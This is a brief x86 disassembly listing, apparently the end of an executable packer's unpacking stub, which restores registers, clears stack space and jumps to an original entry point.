  43136e:	and    BYTE PTR [eax],0x7f
  431371:	and    BYTE PTR [eax+0x28],0x7f
  431375:	pop    eax
  431376:	push   eax
  431377:	push   esp
  431378:	push   eax
  431379:	push   ebx
  43137a:	push   edi
  43137b:	call   ebp
  43137d:	pop    eax
  43137e:	popa   
  43137f:	lea    eax,[esp-0x80]
  431383:	push   0x0
  431385:	cmp    esp,eax
  431387:	jne    0x431383
  431389:	sub    esp,0xffffff80
  43138c:	jmp    0x414908
  431391:	add    BYTE PTR [eax],al
  431393:	add    BYTE PTR [ebx+edx*1+0x13b80043],ch
  43139a:	inc    ebx
  43139b:	add    BYTE PTR [eax+0x4150],bl
	...
